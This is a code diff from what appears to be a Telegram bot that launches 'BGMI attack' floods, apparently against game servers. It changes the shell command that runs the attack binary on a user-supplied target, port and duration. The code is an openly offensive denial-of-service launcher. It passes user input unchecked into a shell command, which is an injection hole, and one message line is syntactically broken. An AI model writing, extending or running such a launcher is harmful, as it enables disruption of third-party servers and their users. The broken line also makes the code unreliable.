@@ -383,7 +383,7 @@ def start_attack(user_id, target, port, duration):
         bot.send_message(user_id, f" response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐢𝐦𝐞: {time} "
         
         # Execute the bgmi command on VPS
-        attack_command = f"./dau {target} {port} {duration} {9} 900"
+        attack_command = f"./trust {target} {port} {duration} {9} 900"
         subprocess.run(attack_command, shell=True, check=True)
         
         bot.send_message(user_id, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
